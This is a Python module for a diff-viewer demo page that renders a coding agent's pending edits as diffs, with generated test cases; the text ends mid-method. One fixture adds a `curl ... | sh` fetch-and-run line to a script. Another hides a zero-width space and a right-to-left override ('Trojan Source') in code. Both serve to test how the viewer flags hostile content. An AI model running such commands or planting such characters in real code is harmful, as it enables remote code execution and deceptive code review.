r"""
The Diff page: every feature of the diff view, on the diffs a coding agent's host is handed.

`imscribe.diff` is the model. It is drawn by
`imscribe.ui.typeset_diff_view.TypesetDiffView` (text set and drawn by the
imtypeset library), and by nothing else: "When the library is not drawing",
below. This page is the
host: it picks a diff, owns the window the view is drawn in, and turns each of
the view's switches from a control. Unified and side by side are both here --
one or the other, or **both at once on the same diff** when the body is at
least `BOTH_MIN_PX` wide, so the two layouts can be compared row for row.

## When the library is not drawing

Decided when the page is built, as `imscribe.ui.pages.typeset` decides it:
`imscribe.typesetter.ready()` true (the app's font callback loaded the
library's fonts) is two `TypesetDiffView`s. Anything else is NO views
(`DiffPage.views` is empty, `renderer` is `"none"`), and the page draws one
wrapped line saying why (`pages.typeset.say_why_not`) and nothing else. A
view call anywhere in the frame that raises
`imscribe.ui.typeset_view.TypesetUnavailable` (the library failed and was
switched off, or its fonts went) drops BOTH views; whatever that frame had
drawn stays, and from the next frame the page is the one line. Nothing else is
caught: an error of the view's own Python is a bug to see.

**The page's state does not need a view.** The case, the mode, the context,
the diff shown (`expand`, `set_context`), the switches and the replay are the
page's and move with no views at all; what is a view's (the current hunk,
which rows are on screen) is then absent: `next_hunk()` answers `None` and
`follow` False. Nothing of the old diff view or the old layout core is
imported by this module, at import or later.

What the view does not report, and what the page says instead:

- **No glyph count in the cost line.** `draw` answers a `bool` (everything
  in view was set as asked) and the library counts no glyphs. The line says
  how many edits the views have made in the library (`edits`: it stands still
  while scrolling and moves by one a document when a line of a replay
  arrives), and `not answered` if a draw said False.
- **No `metrics=`.** The library measures.
- **The cell is the code face's own advance**: 8.0 px at the theme's 16 px,
  which is what this page draws at (`imscribe/ui/typeset_diff_view.py`).
- A character the code face lacks is set from another face at that face's
  advance (the `unseen` case's Greek), and one no face has is whatever the
  library draws.

## The cases, and where they come from

`../pptmstr` shows a pending tool call as a diff (`pptmstr/approval.py`,
`render_diff`): a `Write` is the file on disk against the new content, an `Edit`
is the file with one replacement made, a `MultiEdit` is one small diff per edit
joined together, and an `Edit` whose anchor is not in the file falls back to the
old string against the new one. Each case here is one of those shapes, built the
way a host would build it:

| key | what it is | built from |
|---|---|---|
| `edit` | a small Edit in a Python file | before/after texts |
| `new` | a Write of a file that did not exist | `None` / text |
| `long` | a Write replacing a file of thousands of lines | generated texts |
| `multiedit` | a MultiEdit: three headed fragments, joined | unified text |
| `anchor` | an Edit whose anchor is not in the file | texts + *will not apply* |
| `git` | a `git diff` of four files, one new and one deleted | unified text |
| `wide` | lines several times wider than any pane | generated texts |
| `tokens` | whitespace-only and one-token changes | before/after texts |
| `deleted` | a file removed | text / `None` |

(And nine "hard cases", below.)

The before/after pairs and the unified texts are files under `demo/diff/`
(`demo/diff/README.md` lists them). **Two inputs, one model**: a case built from
texts can have its context widened, its collapsed context revealed and its
changed words marked with the whole file in hand; a case that is only a unified
text is parsed, and says "not available" where the text does not hold the lines.
`long` and `wide` are generated here, deterministically, because a file of four
thousand lines and a line of five hundred characters are not things to keep in a
repository. Outside a checkout the files are absent and the picker holds the
generated cases and one built-in pair: a missing file removes a case, it does
not raise.

## The controls, and which switch of the view each one is

- **layout** -- `TypesetDiffView.set_layout` on one view, or two views side by side.
- **context** -- `Diff.from_texts(..., context=n)` again. Only for cases built
  from texts; a parsed diff has the context its author gave it.
- **expand** -- `Diff.expand` on every gap that can be: `expand_step` lines at a
  time, or all of them. A click on a collapsed-context row in the view does the
  same for that one gap (Shift+click from the other end), and the page adopts
  what the view then shows so that two views do not drift apart.
- **previous / next hunk** -- `TypesetDiffView.previous_hunk` / `next_hunk`, by button
  and by `k` / `j` (pptmstr's review keys) while the page has the keyboard and
  no text box does. The readout names the hunk the view is on.
- **syntax** -- `TypesetDiffView.syntax`, the demo's tokeniser
  (`imscribe.ui.pages._syntax.line_colours`) or `None`.
- **dark** -- another `Palette` to `draw`, and its ground as the pane's colour.
- **cap** -- `TypesetDiffView.height_cap`: the view opens its own child no taller than
  `CAP_PX` and scrolls inside it, which is how it sits in a chat transcript.
- **replay** -- the case's unified text fed to a `UnifiedDiffStream` a line at
  a time, `TypesetDiffView.set_diff(stream.diff)` each frame.

The readouts are counts: `+n -m`, files and hunks, display rows in each layout
and how many are on screen, the cost of drawing the views this frame, and what
the last Ctrl+C put on the clipboard -- which is the demonstration that the
`+`/`-` markers and the line numbers are drawn and never copied.

## The hard cases

Nine more entries, under their own heading in the picker: the inputs reviews
1 and 3 of the diff model found a defect with
(`.concerns/lead--demo-review1-findings.md`, `lead--demo-review3-findings.md`),
each kept as a case so that what the library now does with it is on screen.

| key | what it is | what to see |
|---|---|---|
| `nul` | a NUL and an escape in the new text | rows, placeholders, a header warning |
| `noeol` | a MultiEdit, no closing newlines, from the texts | `Diff.from_edits`: +1 -1 an edit |
| `noeol-text` | the same edits as pptmstr's one string | one removed row an edit: text's limit |
| `eol` | CRLF to LF and nothing else | the header says so; rows folded behind a row |
| `mail` | a `git format-patch` mail | one file; no phantom file, no signature row |
| `combined` | a `diff --cc` merge diff | flagged, drawn as written, no rows |
| `fence` | a fragment whose context is unmarked | the unmarked lines are context |
| `unseen` | invisible, bidirectional and missing characters | placeholders, a header warning |
| `u0` | an honest `diff -U0` of a file with `-- x`, `++ y` lines | one file, two hunks |

## Two views of one diff

In "both" the two panes are two `TypesetDiffView`s on the same `Diff`. They step
hunks together (the page steps one and walks the other), take a scheme change
as one assignment each (`view.syntax = ...`; the views are never rebuilt, so
the current hunk and the selection survive it), and scroll together
vertically: the pane under the mouse leads, and `follow` puts the other on the
row that shows the same line (`top_row`, `row_info`, `row_of`). The
follower lands a frame or two behind, because a scroll asked for in one frame
is ImGui's to apply in the next.

## What has and has not been run

`tests/test_page_diff.py` drives the state without ImGui and the page inside
real ImGui frames with no backend -- where the library has no fonts, so those
frames are the one line, or the page over a stand-in view with the real rows
-- and runs the application in a real window with and without the library,
where it reports which view drew, counts for both layouts, a replay and a
copy. Nobody has looked at it, and nothing here says how any of it looks.

Deliberately not here: applying a diff, editing one, a three-way merge, and any
network -- the cases are canned.
"""

from __future__ import annotations

import difflib
import time
from collections.abc import Callable
from dataclasses import dataclass
from enum import Enum
from functools import cache, partial
from typing import Any, Final

from imscribe.diff import ContextUnavailable, Diff, FileDiff, UnifiedDiffStream
from imscribe.ui.pages import PageContext, PageSpec, caption, debug_toggle, demo_text
from imscribe.ui.pages._syntax import line_colours
from imscribe.ui.pages.themes import COLOURS
from imscribe.ui.pages.typeset import not_drawing, say_why_not, why_not
from imscribe.ui.palette import DARK_PALETTE, DEFAULT_PALETTE, Palette
from imscribe.ui.typeset_diff_view import DiffLayout, SyntaxColour, TypesetDiffView
from imscribe.ui.typeset_view import TypesetUnavailable

__all__ = [
    "BOTH_MIN_PX",
    "CAP_PX",
    "EXPAND_STEP",
    "PAGE",
    "Case",
    "DiffPage",
    "Mode",
    "Pair",
    "cases",
    "control_texts",
    "crlf_texts",
    "long_texts",
    "noeol_edits",
    "u0_text",
    "unified_as_pptmstr",
    "unseen_texts",
    "wide_texts",
]

BOTH_MIN_PX: Final = 900.0
"""
The body width from which both layouts are drawn at once when asked for.

Below it the "both" choice shows the single layout last chosen: side by side
needs two panes of code and unified a third, and under about nine hundred
pixels none of the three would hold a line of code.
"""

UNIFIED_SHARE: Final = 0.4
"""
How much of the width the unified view takes when both are shown. Side by side
is two columns of code and gets the rest.
"""

EXPAND_STEP: Final = 20
"""
How many lines "expand" reveals in a gap when there is no view to ask:
`TypesetDiffView.expand_step`'s default.
"""

CAP_PX: Final = 220.0
"""
The height cap the "cap" control sets, in pixels: about eleven rows.
"""

MAX_CONTEXT: Final = 12
DEFAULT_RATE: Final = 40.0
"""
Lines a second the replay feeds by default.
"""


class Mode(Enum):
    """
    What the page shows: one layout, the other, or both at once.
    """

    UNIFIED = "unified"
    SIDE = "side"
    BOTH = "both"


@dataclass(frozen=True, slots=True)
class Pair:
    """
    One file as a host with the texts has it: before, after, and what to call it.

    `before=None` is a file that did not exist and `after=None` one being
    deleted. `will_not_apply` is the host's own verdict, which the model
    cannot derive: it is shown in the file's header.
    """

    before: str | None
    after: str | None
    label: str
    will_not_apply: str = ""


@dataclass(frozen=True, slots=True)
class Case:
    """
    One entry of the picker: some pairs of texts, or one unified text.

    Exactly one of `pairs` and `unified` is used. `note` is one line saying
    what to look at, in words that claim nothing about appearance.
    """

    key: str
    label: str
    note: str
    pairs: tuple[Pair, ...] = ()
    unified: str | None = None
    hard: bool = False
    """
    One of the "hard cases": inputs a review found the model or the view got
    wrong (`.concerns/lead--demo-review1-findings.md`). Listed under their own
    heading in the picker.
    """

    @property
    def from_texts(self) -> bool:
        """
        Whether the full texts are held, so context can be changed and revealed.
        """
        return self.unified is None

    def diff(self, context: int = 3) -> Diff:
        """
        The model for this case. `context` is ignored for a unified text.
        """
        if self.unified is not None:
            return Diff.from_unified(self.unified)
        files: tuple[FileDiff, ...] = ()
        for pair in self.pairs:
            made = Diff.from_texts(
                pair.before,
                pair.after,
                pair.label,
                context=context,
                will_not_apply=pair.will_not_apply,
            )
            files += made.files
        return Diff(files)

    def unified_text(self) -> str:
        """
        The case as the text a stream would deliver: its own, or its diff written out.
        """
        return self.unified if self.unified is not None else self.diff(3).to_unified()


def unified_as_pptmstr(before: str | None, after: str, label: str) -> str:
    """
    `pptmstr/approval.py`'s `_unified`, copied: the text that host keeps today.

    Here so a case can be stated as "what pptmstr would have produced for this
    call" without importing a sibling project. Three lines of context, `a/` and
    `b/` prefixes unless the label is an absolute path, `/dev/null` for a file
    that did not exist.
    """
    prefix_a, prefix_b = ("", "") if label.startswith("/") else ("a/", "b/")
    lines = difflib.unified_diff(
        (before or "").splitlines(keepends=True),
        after.splitlines(keepends=True),
        fromfile=f"{prefix_a}{label}" if before is not None else "/dev/null",
        tofile=f"{prefix_b}{label}",
        n=3,
    )
    return "".join(lines)


class _Sequence:
    """
    A fixed sequence of numbers (Knuth's 64-bit linear congruence), so that
    the corpus and the selections are the same in every interpreter: what
    `random.Random` gives for a seed is not promised across versions.
    """

    def __init__(self, seed: int) -> None:
        self._state = seed & (2**64 - 1)

    def below(self, limit: int) -> int:
        self._state = (self._state * 6364136223846793005 + 1442695040888963407) % 2**64
        return (self._state >> 33) % max(1, limit)


def long_texts(lines: int = 4000) -> tuple[str, str]:
    """
    A file of `lines` lines of made-up Python and a rewrite of it: the culling case.

    Generated, the same every time, and read from nowhere. (Until 2026-10-11
    it was seven of this package's own modules end to end, every one of them
    the old layout core's: the text moved when one was edited and would have
    become its numbered filler when they are deleted.) It is
    `tests/test_typeset_diff_view.py`'s `fixed_long_texts`, statement for
    statement, and `tests/test_page_diff.py` holds the two equal.

    Code, so the tokeniser has something to colour. No two lines of a function
    are the same text and every function is named by its number, because a
    text that repeats itself gives a line-matching diff a thousand equally
    good wrong alignments (measured: one module repeated came out at +1012
    -1027 for the same forty edits). About one line in twenty-five holds a
    character outside ASCII: U+2192 and U+2502, which the bundled code face
    has, and U+03C0, which it lacks. One line in a hundred is 150 columns or
    more.

    The rewrite touches one line in every ninety-seven, drops a block of forty
    a third of the way down and inserts twenty-five two thirds of the way
    down: many small hunks, a pure removal and a pure addition, with long
    unchanged stretches between them.
    """
    words = ("alpha", "beta", "gamma", "delta", "width", "height", "total", "scale", "items")
    pick = _Sequence(4000)
    before: list[str] = []
    number = 0
    while len(before) < lines:
        number += 1
        word = words[pick.below(len(words))]
        other = words[pick.below(len(words))]
        mark = ("→", "│", "π")[number % 3]
        body = [
            f"def step_{number}({word}, {other}_limit={number % 7}):",
            (
                f'    """Step {number}: {word} {mark} {other}, scaled."""'
                if number % 2 == 0
                else f'    """Step {number}: {word} to {other}, scaled."""'
            ),
            f"    {word}_{number} = compute({word}, {number}) * {other}_limit",
            f"    if {word}_{number} > {pick.below(900) + 100}:",
            f"        {word}_{number} -= adjust({other}_limit, by={pick.below(50)})",
            f"    for index_{number} in range({pick.below(40) + 2}):",
            f"        {word}_{number} += index_{number} % {pick.below(9) + 2}",
            (
                f"    settings_{number} = dict("
                + ", ".join(f"field_{number}_{n}={pick.below(97)}" for n in range(9))
                + ")"
                if number % 9 == 0
                else f"    settings_{number} = dict(kind={word!r}, other={other!r})"
            ),
            f"    record({number}, {word}_{number}, settings_{number})",
            f"    return {word}_{number}",
            "",
            "",
        ]
        before.extend(body)
    del before[lines:]
    after: list[str] = []
    cut = len(before) // 3
    add = 2 * len(before) // 3
    for at, line in enumerate(before):
        if cut <= at < cut + 40:
            continue
        if at == add:
            after.extend(f"# inserted line {extra + 1} of 25" for extra in range(25))
        if at % 97 == 50 and line.strip():
            line = f"{line}  # touched"
        after.append(line)
    return "\n".join(before) + "\n", "\n".join(after) + "\n"


def wide_texts() -> tuple[str, str]:
    """
    Thirty lines, each several panes wide, with changes at both ends and far right.

    Every line is a run of `key=value;` settings between 300 and 460
    characters long. The rewrite changes a value near the start of some lines
    and one past column 280 of others, so a mark is off screen until the view
    is scrolled to it; one line is over five hundred characters, which is past
    the model's limit for marking changed words and is shown as a whole-line
    change.
    """
    before: list[str] = []
    after: list[str] = []
    for row in range(30):
        fields = [
            f"field_{row:02d}_{n:02d}=value{(row * 7 + n * 3) % 97}" for n in range(15 + row % 8)
        ]
        old = "; ".join(fields)
        new_fields = list(fields)
        if row % 5 == 1:
            new_fields[1] = new_fields[1] + "0"
        if row % 5 == 3:
            new_fields[-2] = new_fields[-2].replace("value", "VALUE")
        if row == 12:
            new_fields.insert(8, "inserted=true")
        if row == 20:
            old = "; ".join(fields * 2)
            new_fields = fields * 2
            new_fields[-1] = "last=changed"
        before.append(old)
        after.append("; ".join(new_fields))
    return "\n".join(before) + "\n", "\n".join(after) + "\n"


_BUILT_IN_BEFORE: Final = "def greet(name):\n    print('hello', name)\n\n\ngreet('world')\n"
_BUILT_IN_AFTER: Final = (
    "def greet(name, punctuation='!'):\n    print('hello', name + punctuation)\n\n\n"
    "greet('world')\n"
)


@cache
def cases() -> tuple[Case, ...]:
    """
    The picker's cases, in order. Read once; a case whose file is absent is left out.

    Never empty: `long`, `wide` and a built-in `edit` need no file.
    """

    def read(name: str) -> str | None:
        return demo_text(f"diff/{name}")

    out: list[Case] = []

    before, after = read("edit.before.py"), read("edit.after.py")
    if before is None or after is None:
        before, after = _BUILT_IN_BEFORE, _BUILT_IN_AFTER
    out.append(
        Case(
            "edit",
            "Edit: two lines in a Python file",
            "One hunk in a file of fifty lines: collapsed context above and below it.",
            pairs=(Pair(before, after, "retry.py"),),
        )
    )

    new = read("new_file.py")
    if new is not None:
        out.append(
            Case(
                "new",
                "Write: a new file",
                "No before text: every row is an addition and the old side is empty.",
                pairs=(Pair(None, new, "limits.py"),),
            )
        )

    long_before, long_after = long_texts()
    out.append(
        Case(
            "long",
            "Write: replacing a long file",
            "Four thousand lines; expand all shows every one. The rows drawn are those on screen.",
            pairs=(Pair(long_before, long_after, "imscribe/linebreak_long.py"),),
        )
    )

    multiedit = read("multiedit.diff")
    if multiedit is not None:
        out.append(
            Case(
                "multiedit",
                "MultiEdit: three fragments, joined",
                "Each edit is its own small diff with no file around it: nothing to expand.",
                unified=multiedit,
            )
        )

    old, new_string = read("anchor.old.txt"), read("anchor.new.txt")
    if old is not None and new_string is not None:
        out.append(
            Case(
                "anchor",
                "Edit: the anchor is not in the file",
                "The old string against the new one, labelled by the host as not applying.",
                pairs=(
                    Pair(
                        old,
                        new_string,
                        "client.py",
                        will_not_apply="anchor not found in file",
                    ),
                ),
            )
        )

    git = read("git.diff")
    if git is not None:
        out.append(
            Case(
                "git",
                "git diff: four files",
                "A modified file, a new one, another modified, a deleted one, as git wrote them.",
                unified=git,
            )
        )

    wide_before, wide_after = wide_texts()
    out.append(
        Case(
            "wide",
            "Lines far wider than the pane",
            "Lines do not wrap. Shift+wheel or the bar scrolls; the gutter stays.",
            pairs=(Pair(wide_before, wide_after, "settings.ini"),),
        )
    )

    before, after = read("tokens.before.py"), read("tokens.after.py")
    if before is not None and after is not None:
        out.append(
            Case(
                "tokens",
                "Whitespace-only and one-token changes",
                "A number, an operator, a name, tabs to spaces: the part that changed is marked.",
                pairs=(Pair(before, after, "receipt.py"),),
            )
        )

    deleted = read("deleted.sh")
    if deleted is not None:
        out.append(
            Case(
                "deleted",
                "A deleted file",
                "No after text: every row is a removal and the new side is empty.",
                pairs=(Pair(deleted, None, "setup.sh"),),
            )
        )
    out += _hard_cases(read)
    return tuple(out)


def noeol_edits() -> tuple[Pair, ...]:
    """
    Three edits whose strings have no closing newline -- the usual shape of an
    Edit's `old_string` and `new_string` -- as a host holds them.
    """
    return (
        Pair("timeout = 5", "timeout = 30", "edit 1"),
        Pair("retries = 3", "retries = 5", "edit 2"),
        Pair("    return None", "    raise TimeoutError(url)", "edit 3"),
    )


def control_texts() -> tuple[str, str]:
    """
    A small script, and the same with two lines added of which one holds a NUL
    and an escape. Generated: a NUL is not a thing to keep in a file an editor
    will open.
    """
    before = "#!/bin/sh\nset -e\nmake test\n"
    after = "#!/bin/sh\nset -e\ncurl -s https://example.org/x | sh\n\0\x1b[2K\rmake test\n"
    return before, after


def unseen_texts() -> tuple[str, str]:
    """
    A few lines of code, and the same with what cannot be seen put into them:
    a zero-width space inside `admin`, a right-to-left override before a
    comment (the "Trojan Source" shape: the line reads differently from what
    it is), a Greek letter the code face has no glyph for, and CJK that no
    bundled face has. Written with `chr`, so that this file holds none of
    them.
    """
    zero_width, override, pi, tau = chr(0x200B), chr(0x202E), chr(0x3C0), chr(0x3C4)
    note = chr(0x6CE8) + chr(0x91CA)
    before = (
        f"area = {pi} * r * r\n"
        'if user == "admin":\n'
        "    grant(user)  # checked above\n"
        "# note\n"
    )
    after = (
        f"area = {tau} / 2 * r * r\n"
        f'if user == "ad{zero_width}min":\n'
        f"    grant(user)  # {override}checked above\n"
        f"# {note}\n"
    )
    return before, after


def u0_text() -> str:
    """
    What `diff -U0` (here `difflib`, `n=0`) writes for a file of notes in
    which the line `-- removed entry` became `++ added entry`, with another
    change further down: the removal is the physical line `--- removed
    entry`, the addition `+++ added entry`, and the next hunk's `@@` follows
    them directly. Every count in it is true.
    """
    before = "title\n-- removed entry\nkeep 1\nkeep 2\nkeep 3\nold tail\n-- x\nend\n"
    after = "title\n++ added entry\nkeep 1\nkeep 2\nkeep 3\nnew tail\n++ y\nend\n"
    return "".join(
        difflib.unified_diff(
            before.splitlines(keepends=True),
            after.splitlines(keepends=True),
            "a/notes.txt",
            "b/notes.txt",
            n=0,
        )
    )


def crlf_texts() -> tuple[str, str]:
    """
    One text with CRLF line endings and the same text with LF: every line
    differs and no character of any line does. Generated, because a checkout
    or an editor may rewrite the endings of a file.
    """
    lines = [
        "[server]",
        "host = 127.0.0.1",
        "port = 8080",
        "",
        "[client]",
        "timeout = 30",
        "retries = 5",
    ]
    return "".join(line + "\r\n" for line in lines), "".join(line + "\n" for line in lines)


def _hard_cases(read: Callable[[str], str | None]) -> list[Case]:
    """
    The inputs review 1 found a defect with, each as a case of its own so the
    remedy is on screen. Their notes say what is being shown, not that it is
    right.
    """
    out: list[Case] = []
    before, after = control_texts()
    out.append(
        Case(
            "nul",
            "A NUL byte and an escape in the new text",
            "Diffed like any text: a placeholder per control character, and the header says so.",
            pairs=(Pair(before, after, "run.sh"),),
            hard=True,
        )
    )
    out.append(
        Case(
            "noeol",
            "MultiEdit, no closing newlines: from the texts",
            "Diff.from_edits on the three edits: +1 -1 each, under the edit it belongs to.",
            pairs=noeol_edits(),
            hard=True,
        )
    )
    out.append(
        Case(
            "noeol-text",
            "MultiEdit, no closing newlines: from pptmstr's text",
            "The same edits as one unified string: '-old+new' is one line there, read as one "
            "removed row per edit. The text cannot say more; from_edits can.",
            unified="\n".join(
                unified_as_pptmstr(pair.before, pair.after or "", pair.label)
                for pair in noeol_edits()
            ),
            hard=True,
        )
    )
    before, after = crlf_texts()
    out.append(
        Case(
            "eol",
            "Only the line endings changed",
            "CRLF to LF: said in the header, rows folded behind one row; click it to see "
            "each line's ending.",
            pairs=(Pair(before, after, "settings.ini"),),
            hard=True,
        )
    )
    for key, name, label, note in (
        (
            "mail",
            "mail.patch",
            "git format-patch: a mail around a diff",
            "The message, its '---' and its '-- ' signature are not rows: one file, +4 -3.",
        ),
        (
            "combined",
            "combined.diff",
            "A combined (merge) diff",
            "Two marker columns, which are not read: flagged, and shown as written.",
        ),
        (
            "fence",
            "unmarked.diff",
            "A model's fragment with unmarked context",
            "No headers, and context lines with no leading space: read as context.",
        ),
    ):
        text = read(name)
        if text is not None:
            out.append(Case(key, label, note, unified=text, hard=True))
    before, after = unseen_texts()
    out.append(
        Case(
            "unseen",
            "Characters that cannot be seen, or that the code face lacks",
            "A zero-width space, a right-to-left override, Greek, CJK: a placeholder for "
            "what draws as nothing or is in no face, another face's glyph for the Greek, "
            "and the header says which kind.",
            pairs=(Pair(before, after, "geom.py"),),
            hard=True,
        )
    )
    out.append(
        Case(
            "u0",
            "An honest -U0 diff of a file with '-- x' and '++ y' lines",
            "'--- removed entry', '+++ added entry', '@@': a removed row, an added row and "
            "the same file's next hunk, because the counts say so. One file.",
            unified=u0_text(),
            hard=True,
        )
    )
    return out


class DiffPage:
    """
    The page's state and one frame of it.

    Every control is a method that needs no ImGui (`choose`, `set_mode`,
    `set_context`, `expand`, `next_hunk`, `set_syntax`, `set_dark`,
    `set_capped`, `start_replay`, `advance`); `draw` calls them from widgets.
    """

    def __init__(
        self, context: PageContext, timer: Callable[[], float] = time.perf_counter
    ) -> None:
        self.context = context
        self.timer = timer
        self.cases = cases()
        options = context.options_for("Diff")
        self.case = next((case for case in self.cases if case.key in options), self.cases[0])
        self.mode = next((mode for mode in Mode if mode.value in options), Mode.BOTH)
        self.single = DiffLayout.SIDE_BY_SIDE if self.mode is Mode.SIDE else DiffLayout.UNIFIED
        count = context.count_for("Diff")
        self.context_lines = 3 if count is None else max(0, min(MAX_CONTEXT, count))
        self.syntax_on = True
        self.dark = "dark" in options
        self.capped = "cap" in options
        self.rate = DEFAULT_RATE
        self.paused = False
        self.stream: UnifiedDiffStream | None = None
        self._lines: list[str] = []
        self.fed = 0
        self._carry = 0.0
        self.copied: str | None = None
        self.copies = 0
        self.draw_ms = 0.0
        self.mean_ms = 0.0
        self.frames = 0
        self.stats: dict[DiffLayout, bool] = {}
        """What each view drawn in the last frame answered: everything in view was set as asked."""
        self.error = ""
        self.diff = self.case.diff(self.context_lines)
        self.views: dict[DiffLayout, Any] = {}
        """The two `TypesetDiffView`s, by layout; EMPTY while the library is not drawing."""
        self.reason = ""
        """Why there are no views, when there are none."""
        self._colour: SyntaxColour = self._syntax()
        self._asked: dict[DiffLayout, int] = {}
        self._make_views()
        if "stream" in options:
            self.start_replay()

    # -- the scheme --------------------------------------------------------

    @property
    def palette(self) -> Palette:
        return DARK_PALETTE if self.dark else DEFAULT_PALETTE

    def _syntax(self) -> SyntaxColour:
        return line_colours(COLOURS[1 if self.dark else 0].syntax)

    def _record_copy(self, view: Any) -> str:
        """
        `copy_as` of a view: what Ctrl+C is about to write, kept for the readout.
        """
        self.copied = view.selected_text()
        self.copies += 1
        return self.copied

    @property
    def renderer(self) -> str:
        """`"TypesetDiffView"` while the library draws this page, `"none"` when nothing does."""
        return "TypesetDiffView" if self.views else "none"

    def _make_views(self) -> None:
        """
        Make the two views, once. Every switch after that is an attribute of a view.

        None at all, and the reason, when the library cannot draw (the module
        docstring, "When the library is not drawing").
        """
        colour = self._syntax()
        self._colour = colour
        self.reason = why_not()
        if self.reason:
            return
        try:
            self.views = {
                layout: TypesetDiffView(
                    self.diff,
                    self.context.theme,
                    layout=layout,
                    px_per_inch=self.context.px_per_inch,
                    syntax=colour if self.syntax_on else None,
                    height_cap=CAP_PX if self.capped else None,
                    copy_as=self._record_copy,
                )
                for layout in DiffLayout
            }
        except TypesetUnavailable as exc:
            self.views = {}
            self.reason = str(exc) or "the typeset views could not be made"

    def _give_up(self, exc: TypesetUnavailable) -> None:
        """
        The library cannot draw any more: the views go, and the reason stays.

        The page's own state (the case, the diff shown, the mode, the
        switches, a replay) is untouched.
        """
        self.reason = str(exc) or "imtypeset is not ready"
        for view in self.views.values():
            close = getattr(view, "close", None)
            if close is not None:
                close()
        self.views = {}
        self.stats = {}
        self._asked = {}

    def shown(self, width_px: float) -> tuple[Any, ...]:
        """
        The views drawn at this body width: one, or both when asked for and it fits.

        None when there are no views.
        """
        if not self.views:
            return ()
        if self.mode is Mode.BOTH and width_px >= BOTH_MIN_PX:
            return (self.views[DiffLayout.UNIFIED], self.views[DiffLayout.SIDE_BY_SIDE])
        return (self.views[self.single],)

    # -- what is shown -----------------------------------------------------

    def _show(self, diff: Diff) -> None:
        self.diff = diff
        for view in self.views.values():
            if view.diff is not diff:
                view.set_diff(diff)

    def choose(self, case: Case) -> None:
        """
        Show another case, whole, from its first row. Ends a replay.
        """
        self.case = case
        self.stream = None
        self.error = ""
        self._show(case.diff(self.context_lines))
        for view in self.views.values():
            view.clear_selection()
            view.scroll_x = 0
            view.scroll_to_row(0)

    def set_mode(self, mode: Mode) -> None:
        self.mode = mode
        if mode is Mode.UNIFIED:
            self.single = DiffLayout.UNIFIED
        elif mode is Mode.SIDE:
            self.single = DiffLayout.SIDE_BY_SIDE

    def set_context(self, lines: int) -> bool:
        """
        Re-diff the case with `lines` of context. False if this case cannot be.

        Drops any context revealed by hand: the hunks are made again.
        """
        lines = max(0, min(MAX_CONTEXT, lines))
        if lines == self.context_lines:
            return True
        self.context_lines = lines
        if not self.case.from_texts or self.stream is not None:
            return False
        self._show(self.case.diff(lines))
        return True

    @property
    def expandable(self) -> int:
        """
        How many collapsed stretches of the diff shown can be revealed.
        """
        return sum(1 for file in self.diff.files for gap in file.gaps if gap.expandable)

    def expand(self, lines: int | None = None, *, everything: bool = False) -> int:
        """
        Reveal context in every gap that has any: one step, or all of it.

        Returns how many gaps were widened. Gaps are taken last to first within
        a file, because using one up merges two hunks and renumbers the rest.
        """
        step = None if everything else (lines if lines is not None else self._step())
        diff = self.diff
        widened = 0
        try:
            for number, file in enumerate(diff.files):
                for gap in reversed(file.gaps):
                    if gap.expandable:
                        diff = diff.expand(number, gap.index, step)
                        widened += 1
        except ContextUnavailable as error:  # a parsed diff: nothing to reveal
            self.error = str(error)
        if widened:
            self._show(diff)
        return widened

    def _step(self) -> int:
        view = self.views.get(DiffLayout.UNIFIED)
        return EXPAND_STEP if view is None else int(view.expand_step)

    def adopt(self) -> bool:
        """
        Take up a diff a view expanded by itself (a click on a collapsed row).

        Call after drawing. True if a view had moved on and the other was brought along.
        """
        for view in self.views.values():
            if view.diff is not self.diff:
                self._show(view.diff)
                return True
        return False

    # -- hunks -------------------------------------------------------------

    def hunks(self) -> list[tuple[int, int]]:
        """
        Every `(file, hunk)` of the diff shown, in display order.
        """
        return [
            (number, at)
            for number, file in enumerate(self.diff.files)
            for at in range(len(file.hunks))
        ]

    def next_hunk(self) -> tuple[int, int] | None:
        return self._step_hunk(forward=True)

    def previous_hunk(self) -> tuple[int, int] | None:
        return self._step_hunk(forward=False)

    def _step_hunk(self, *, forward: bool) -> tuple[int, int] | None:
        # The first view decides and the second is walked to the same hunk, so
        # two views that started apart end on one hunk and not one step apart.
        views = list(self.views.values())
        if not views:
            return None
        target: tuple[int, int] | None = (
            views[0].next_hunk() if forward else views[0].previous_hunk()
        )
        for view in views[1:]:
            self._walk(view, target)
        return target

    def _walk(self, view: Any, target: tuple[int, int] | None) -> None:
        if target is None:
            return
        keys = self.hunks()
        if target not in keys:
            return
        for _ in range(len(keys) + 1):
            current = view.current_hunk
            if current == target:
                return
            if current is None or keys.index(current) < keys.index(target):
                view.next_hunk()
            else:
                view.previous_hunk()

    def follow(self, leader: DiffLayout) -> bool:
        """
        Bring the other view to the line at the top of `leader`'s window.

        `top_row` is the display row at the top; the two layouts
        number their rows differently, so the row is carried as *what it
        shows* (`row_info`) and found again in the other layout (`row_of`).
        True if the other view was asked to scroll. Asked once per target: a
        view that cannot scroll that far (it is shorter) is not asked again
        every frame.
        """
        other = next(layout for layout in DiffLayout if layout is not leader)
        if leader not in self.views or other not in self.views:
            return False
        source, target = self.views[leader], self.views[other]
        if not source.row_count or not target.row_count:
            return False
        want = target.row_of(source.row_info(min(source.top_row, source.row_count - 1)))
        if target.top_row == want or self._asked.get(other) == want:
            return False
        self._asked[other] = want
        target.top_row = want
        return True

    def hunk_line(self) -> str:
        """
        Where the views are: "hunk 3 of 7 -- retry.py @@ -31,7 +31,8 @@".
        """
        keys = self.hunks()
        if not keys:
            return "no hunks"
        view = self.views.get(DiffLayout.UNIFIED)
        current = None if view is None else view.current_hunk
        if current is None or current not in keys:
            return f"{len(keys)} hunk(s); j / k or the buttons step through them"
        file = self.diff.files[current[0]]
        return (
            f"hunk {keys.index(current) + 1} of {len(keys)} -- "
            f"{file.label} {file.hunks[current[1]].header}"
        )

    # -- switches ----------------------------------------------------------

    def set_syntax(self, on: bool) -> None:
        """
        Colour by the demo's tokeniser, or not. The same callable each time.
        """
        self.syntax_on = on
        for view in self.views.values():
            view.syntax = self._colour if on else None

    def set_dark(self, dark: bool) -> None:
        """
        Draw in the dark palette or the light one, with that scheme's syntax inks.

        The palette is an argument of `draw`; the syntax inks are in the spans
        the highlighter returns, so the views are given the other scheme's
        highlighter. The views themselves stay: their current hunk, selection
        and scroll are untouched.
        """
        if dark == self.dark:
            return
        self.dark = dark
        self._colour = self._syntax()
        if self.syntax_on:
            for view in self.views.values():
                view.syntax = self._colour

    def set_capped(self, capped: bool) -> None:
        self.capped = capped
        for view in self.views.values():
            view.height_cap = CAP_PX if capped else None

    # -- the replay --------------------------------------------------------

    @property
    def replaying(self) -> bool:
        return self.stream is not None

    @property
    def replay_done(self) -> bool:
